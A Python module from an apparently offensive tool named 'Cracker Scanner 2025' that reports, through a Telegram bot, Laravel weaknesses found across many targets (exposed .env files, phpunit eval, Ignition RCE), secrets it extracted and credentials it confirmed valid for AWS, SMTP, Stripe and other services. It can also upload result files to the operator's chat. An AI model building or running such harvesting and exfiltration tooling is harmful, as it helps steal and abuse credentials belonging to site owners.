#!/usr/bin/env python3
"""
Telegram notification module for Cracker Scanner 2025
Sends real-time alerts and scan results via Telegram Bot API
"""

import asyncio
import aiohttp
import json
from typing import Dict, List, Any, Optional
from datetime import datetime
import html

from core.utils import print_status, Colors

class TelegramNotifier:
    """Send notifications via Telegram Bot API"""
    
    def __init__(self, bot_token: str, chat_id: str, timeout: int = 10):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.timeout = timeout
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
        
        # Message limits
        self.max_message_length = 4096
        self.max_caption_length = 1024
    
    async def send_message(self, text: str, parse_mode: str = 'HTML', 
                          disable_web_page_preview: bool = True) -> bool:
        """Send a text message via Telegram"""
        try:
            # Split long messages
            messages = self._split_message(text)
            
            for message in messages:
                payload = {
                    'chat_id': self.chat_id,
                    'text': message,
                    'parse_mode': parse_mode,
                    'disable_web_page_preview': disable_web_page_preview
                }
                
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
                    async with session.post(f"{self.api_url}/sendMessage", json=payload) as response:
                        if response.status != 200:
                            error_text = await response.text()
                            print_status(f"Telegram message failed: {error_text}", "error")
                            return False
                
                # Small delay between messages to avoid rate limiting
                if len(messages) > 1:
                    await asyncio.sleep(1)
            
            print_status("Telegram message sent successfully", "success")
            return True
        
        except Exception as e:
            print_status(f"Telegram message failed: {str(e)}", "error")
            return False
    
    async def send_scan_started(self, targets_count: int, paths_count: int) -> bool:
        """Send notification when scan starts"""
        message = f"""
🔐 <b>CRACKER SCANNER 2025 - SCAN STARTED</b> 🔐

📊 <b>Scan Details:</b>
• Targets: <code>{targets_count}</code>
• Paths: <code>{paths_count}</code>
• Total tasks: <code>{targets_count * paths_count}</code>
• Started: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>

🔍 Scanning for Laravel vulnerabilities and credentials...
        """
        
        return await self.send_message(message.strip())
    
    async def send_vulnerability_found(self, vulnerability: Dict[str, Any]) -> bool:
        """Send immediate alert when vulnerability is found"""
        vuln_type = vulnerability.get('vulnerability_type', 'Unknown')
        url = vulnerability.get('url', '')
        status_code = vulnerability.get('status_code', 0)
        content_length = vulnerability.get('content_length', 0)
        
        # Determine severity emoji
        severity_emoji = self._get_severity_emoji(vuln_type)
        
        message = f"""
{severity_emoji} <b>VULNERABILITY FOUND</b> {severity_emoji}

🎯 <b>Target:</b> <code>{html.escape(url)}</code>
🔍 <b>Type:</b> <code>{vuln_type}</code>
📊 <b>Status:</b> <code>{status_code}</code>
📏 <b>Size:</b> <code>{content_length} bytes</code>
⏰ <b>Time:</b> <code>{datetime.now().strftime('%H:%M:%S')}</code>
        """
        
        # Add extracted secrets information
        if vulnerability.get('extracted_data', {}).get('secrets'):
            secrets = vulnerability['extracted_data']['secrets']
            message += "\n💎 <b>Secrets Found:</b>\n"
            
            for secret_type, items in secrets.items():
                if items:
                    message += f"• <code>{secret_type.upper()}</code>: {len(items)} item(s)\n"
        
        return await self.send_message(message.strip())
    
    async def send_scan_progress(self, completed: int, total: int, 
                               vulnerabilities_found: int) -> bool:
        """Send scan progress update"""
        percentage = (completed / total * 100) if total > 0 else 0
        progress_bar = self._create_progress_bar(percentage)
        
        message = f"""
📈 <b>SCAN PROGRESS UPDATE</b>

{progress_bar} <code>{percentage:.1f}%</code>

📊 <b>Statistics:</b>
• Completed: <code>{completed:,}</code> / <code>{total:,}</code>
• Vulnerabilities: <code>{vulnerabilities_found}</code>
• Rate: <code>{(completed/total*100):.1f}%</code>
        """
        
        return await self.send_message(message.strip())
    
    async def send_scan_complete(self, summary: Dict[str, Any]) -> bool:
        """Send final scan completion summary"""
        duration = summary.get('duration', 0)
        total_vulnerabilities = summary.get('total_vulnerabilities', 0)
        total_secrets = summary.get('total_secrets', 0)
        total_targets = summary.get('total_targets', 0)
        
        # Format duration
        if duration > 3600:
            duration_str = f"{duration/3600:.1f}h"
        elif duration > 60:
            duration_str = f"{duration/60:.1f}m"
        else:
            duration_str = f"{duration:.1f}s"
        
        message = f"""
✅ <b>SCAN COMPLETED SUCCESSFULLY</b> ✅

📊 <b>Final Results:</b>
• Targets scanned: <code>{total_targets:,}</code>
• Vulnerabilities found: <code>{total_vulnerabilities}</code>
• Secrets extracted: <code>{total_secrets}</code>
• Duration: <code>{duration_str}</code>
• Rate: <code>{total_targets/duration:.1f} targets/sec</code>
        """
        
        # Add vulnerability breakdown
        if summary.get('vulnerability_types'):
            message += "\n🔍 <b>Vulnerability Breakdown:</b>\n"
            for vuln_type, count in summary['vulnerability_types'].items():
                emoji = self._get_type_emoji(vuln_type)
                message += f"{emoji} <code>{vuln_type}</code>: {count}\n"
        
        # Add credential validation results
        if summary.get('valid_credentials_by_service'):
            valid_creds = summary['valid_credentials_by_service']
            total_valid = sum(valid_creds.values())
            
            if total_valid > 0:
                message += f"\n💎 <b>Valid Credentials Found:</b> <code>{total_valid}</code>\n"
                for service, count in valid_creds.items():
                    if count > 0:
                        service_emoji = self._get_service_emoji(service)
                        message += f"{service_emoji} <code>{service.upper()}</code>: {count}\n"
        
        message += f"\n🕒 <b>Completed:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"
        
        return await self.send_message(message.strip())
    
    async def send_credentials_found(self, valid_credentials: Dict[str, List[Dict]]) -> bool:
        """Send notification about valid credentials found"""
        total_valid = sum(len(creds) for creds in valid_credentials.values())
        
        if total_valid == 0:
            return True
        
        message = f"""
💎 <b>VALID CREDENTIALS CONFIRMED</b> 💎

🔓 <b>Total Valid:</b> <code>{total_valid}</code>

<b>Breakdown by Service:</b>
        """
        
        for service, creds in valid_credentials.items():
            if creds:
                service_emoji = self._get_service_emoji(service)
                message += f"\n{service_emoji} <b>{service.upper()}:</b> <code>{len(creds)}</code> valid"
                
                # Add sample credential info (masked)
                for i, cred in enumerate(creds[:3], 1):  # Show first 3
                    cred_info = cred.get('credentials', {})
                    if service == 'smtp':
                        host = cred_info.get('host', 'unknown')
                        username = cred_info.get('username', 'unknown')
                        message += f"\n  • <code>{self._mask_credential(username)}@{host}</code>"
                    elif service == 'aws':
                        access_key = cred_info.get('access_key_id', 'unknown')
                        message += f"\n  • <code>{self._mask_credential(access_key)}</code>"
                    elif service in ['sendgrid', 'mailgun', 'twilio', 'stripe']:
                        key = next(iter(cred_info.values()), 'unknown')
                        message += f"\n  • <code>{self._mask_credential(key)}</code>"
                
                if len(creds) > 3:
                    message += f"\n  ... and {len(creds) - 3} more"
        
        return await self.send_message(message.strip())
    
    async def send_error_alert(self, error_message: str, context: str = "") -> bool:
        """Send error alert"""
        message = f"""
❌ <b>SCAN ERROR ALERT</b> ❌

🚨 <b>Error:</b> <code>{html.escape(error_message)}</code>
        """
        
        if context:
            message += f"\n📍 <b>Context:</b> <code>{html.escape(context)}</code>"
        
        message += f"\n⏰ <b>Time:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"
        
        return await self.send_message(message.strip())
    
    async def send_file(self, file_path: str, caption: str = "") -> bool:
        """Send a file via Telegram"""
        try:
            with open(file_path, 'rb') as file:
                form_data = aiohttp.FormData()
                form_data.add_field('chat_id', self.chat_id)
                form_data.add_field('document', file, filename=file_path.split('/')[-1])
                
                if caption:
                    # Truncate caption if too long
                    if len(caption) > self.max_caption_length:
                        caption = caption[:self.max_caption_length-3] + "..."
                    form_data.add_field('caption', caption)
                    form_data.add_field('parse_mode', 'HTML')
                
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                    async with session.post(f"{self.api_url}/sendDocument", data=form_data) as response:
                        if response.status == 200:
                            print_status("File sent via Telegram successfully", "success")
                            return True
                        else:
                            error_text = await response.text()
                            print_status(f"Telegram file send failed: {error_text}", "error")
                            return False
        
        except Exception as e:
            print_status(f"Telegram file send failed: {str(e)}", "error")
            return False
    
    def _split_message(self, text: str) -> List[str]:
        """Split long messages into chunks"""
        if len(text) <= self.max_message_length:
            return [text]
        
        messages = []
        current_message = ""
        
        for line in text.split('\n'):
            if len(current_message + line + '\n') > self.max_message_length:
                if current_message:
                    messages.append(current_message.strip())
                    current_message = line + '\n'
                else:
                    # Line itself is too long, split it
                    while len(line) > self.max_message_length:
                        messages.append(line[:self.max_message_length])
                        line = line[self.max_message_length:]
                    current_message = line + '\n'
            else:
                current_message += line + '\n'
        
        if current_message:
            messages.append(current_message.strip())
        
        return messages
    
    def _create_progress_bar(self, percentage: float, length: int = 10) -> str:
        """Create ASCII progress bar"""
        filled = int(length * percentage / 100)
        bar = '█' * filled + '░' * (length - filled)
        return f"[{bar}]"
    
    def _mask_credential(self, credential: str) -> str:
        """Mask sensitive parts of credentials"""
        if len(credential) <= 8:
            return '*' * len(credential)
        
        # Show first 4 and last 4 characters
        return credential[:4] + '*' * (len(credential) - 8) + credential[-4:]
    
    def _get_severity_emoji(self, vuln_type: str) -> str:
        """Get emoji based on vulnerability severity"""
        high_severity = ['env_exposed', 'phpunit_eval', 'ignition_rce']
        medium_severity = ['telescope_exposed', 'config_exposed']
        
        if vuln_type in high_severity:
            return '🚨'
        elif vuln_type in medium_severity:
            return '⚠️'
        else:
            return '🔍'
    
    def _get_type_emoji(self, vuln_type: str) -> str:
        """Get emoji for vulnerability type"""
        emoji_map = {
            'env_exposed': '📄',
            'phpunit_eval': '💉',
            'ignition_rce': '🔥',
            'telescope_exposed': '🔭',
            'config_exposed': '⚙️',
            'log_exposed': '📝',
            'debug_exposed': '🐛'
        }
        return emoji_map.get(vuln_type, '🔍')
    
    def _get_service_emoji(self, service: str) -> str:
        """Get emoji for service type"""
        emoji_map = {
            'smtp': '📧',
            'aws': '☁️',
            'sendgrid': '📨',
            'mailgun': '🔫',
            'twilio': '📱',
            'stripe': '💳'
        }
        return emoji_map.get(service, '🔑')
    
    async def test_connection(self) -> bool:
        """Test Telegram bot connection"""
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
                async with session.get(f"{self.api_url}/getMe") as response:
                    if response.status == 200:
                        bot_info = await response.json()
                        bot_name = bot_info.get('result', {}).get('first_name', 'Unknown')
                        print_status(f"Telegram bot connected: {bot_name}", "success")
                        return True
                    else:
                        print_status(f"Telegram bot test failed: {response.status}", "error")
                        return False
        
        except Exception as e:
            print_status(f"Telegram connection test failed: {str(e)}", "error")
            return False

class TelegramManager:
    """High-level manager for Telegram notifications"""
    
    def __init__(self, config: Dict[str, Any]):
        self.enabled = config.get('enabled', False)
        self.notifier = None
        
        if self.enabled:
            bot_token = config.get('bot_token')
            chat_id = config.get('chat_id')
            
            if bot_token and chat_id:
                self.notifier = TelegramNotifier(bot_token, chat_id)
            else:
                print_status("Telegram credentials missing, notifications disabled", "warning")
                self.enabled = False
    
    async def initialize(self) -> bool:
        """Initialize and test Telegram connection"""
        if not self.enabled:
            return False
        
        return await self.notifier.test_connection()
    
    async def notify_scan_started(self, targets_count: int, paths_count: int) -> bool:
        """Notify scan start"""
        if not self.enabled:
            return False
        
        return await self.notifier.send_scan_started(targets_count, paths_count)
    
    async def notify_vulnerability_found(self, vulnerability: Dict[str, Any]) -> bool:
        """Notify when vulnerability is found"""
        if not self.enabled:
            return False
        
        return await self.notifier.send_vulnerability_found(vulnerability)
    
    async def notify_scan_complete(self, summary: Dict[str, Any], 
                                 valid_credentials: Dict[str, List[Dict]]) -> bool:
        """Notify scan completion"""
        if not self.enabled:
            return False
        
        # Send completion summary
        success1 = await self.notifier.send_scan_complete(summary)
        
        # Send credentials if found
        success2 = True
        if valid_credentials and any(valid_credentials.values()):
            success2 = await self.notifier.send_credentials_found(valid_credentials)
        
        return success1 and success2
    
    async def notify_error(self, error_message: str, context: str = "") -> bool:
        """Notify about errors"""
        if not self.enabled:
            return False
        
        return await self.notifier.send_error_alert(error_message, context)
    
    async def send_results_file(self, file_path: str, file_type: str) -> bool:
        """Send results file"""
        if not self.enabled:
            return False
        
        caption = f"📄 <b>Scan Results ({file_type.upper()})</b>\n\n"
        caption += f"📁 File: <code>{file_path.split('/')[-1]}</code>\n"
        caption += f"⏰ Generated: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"
        
        return await self.notifier.send_file(file_path, caption)

async def test_telegram():
    """Test Telegram functionality"""
    # This would need real credentials to test
    config = {
        'enabled': True,
        'bot_token': 'YOUR_BOT_TOKEN',
        'chat_id': 'YOUR_CHAT_ID'
    }
    
    manager = TelegramManager(config)
    
    if await manager.initialize():
        print("Telegram test successful")
        
        # Test notifications
        await manager.notify_scan_started(100, 50)
        
        test_vuln = {
            'url': 'https://example.com/.env',
            'vulnerability_type': 'env_exposed',
            'status_code': 200,
            'content_length': 1024,
            'extracted_data': {
                'secrets': {
                    'smtp': ['test@example.com'],
                    'aws': ['AKIATEST']
                }
            }
        }
        
        await manager.notify_vulnerability_found(test_vuln)
        
        test_summary = {
            'total_targets': 100,
            'total_vulnerabilities': 5,
            'total_secrets': 10,
            'duration': 120.5,
            'vulnerability_types': {
                'env_exposed': 3,
                'config_exposed': 2
            }
        }
        
        await manager.notify_scan_complete(test_summary, {})
    else:
        print("Telegram test failed")

if __name__ == "__main__":
    asyncio.run(test_telegram())